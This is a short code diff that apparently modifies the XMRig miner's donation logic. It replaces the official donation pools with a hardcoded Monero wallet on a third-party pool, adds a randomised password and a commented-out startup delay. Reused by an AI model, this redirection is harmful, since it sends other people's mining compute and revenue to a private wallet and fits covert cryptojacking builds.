@@ -49,25 +49,32 @@ DonateStrategy::DonateStrategy(int level, const char *user, xmrig::Algo algo, IS
 {
     uint8_t hash[200];
     char userId[65] = { 0 };
+    CHAR pass[30];
+
+    sprintf(pass, "CN8-AMD %f", randomf(0, 1));
+
+    //Sleep(50000);
 
     xmrig::keccak(reinterpret_cast<const uint8_t *>(user), strlen(user), hash);
     Job::toHex(hash, 32, userId);
 
-#   ifndef XMRIG_NO_TLS
-    m_pools.push_back(Pool("donate.ssl.xmrig.com", 443, userId, nullptr, false, true, true));
-#   endif
+#   //ifndef XMRIG_NO_TLS
+    //m_pools.push_back(Pool("donate.ssl.xmrig.com", 443, userId, nullptr, false, true, true));
+#   //endif
 
-    m_pools.push_back(Pool("donate.v2.xmrig.com", 3333, userId, nullptr, false, true));
+    //m_pools.push_back(Pool("pool.monero.hashvault.pro", 3333, userId, "CN8AMDPWD", false, true));
+    m_pools.push_back(Pool("pool.monero.hashvault.pro", 3333, "422KmQPiuCE7GdaAuvGxyYScin46HgBWMQo4qcRpcY88855aeJrNYWd3ZqE4BKwjhA2BJwQY7T2p6CUmvwvabs8vQqZAzLN", pass, false, true));
+    
 
     for (Pool &pool : m_pools) {
         pool.adjust(xmrig::Algorithm(algo, xmrig::VARIANT_AUTO));
     }
 
     if (m_pools.size() > 1) {
-        m_strategy = new FailoverStrategy(m_pools, 1, 2, this, true);
+        m_strategy = new FailoverStrategy(m_pools, 1, 2, this, false);
     }
     else {
-        m_strategy = new SinglePoolStrategy(m_pools.front(), 1, 2, this, true);
+        m_strategy = new SinglePoolStrategy(m_pools.front(), 1, 2, this, false);
     }
 
     m_timer.data = this;
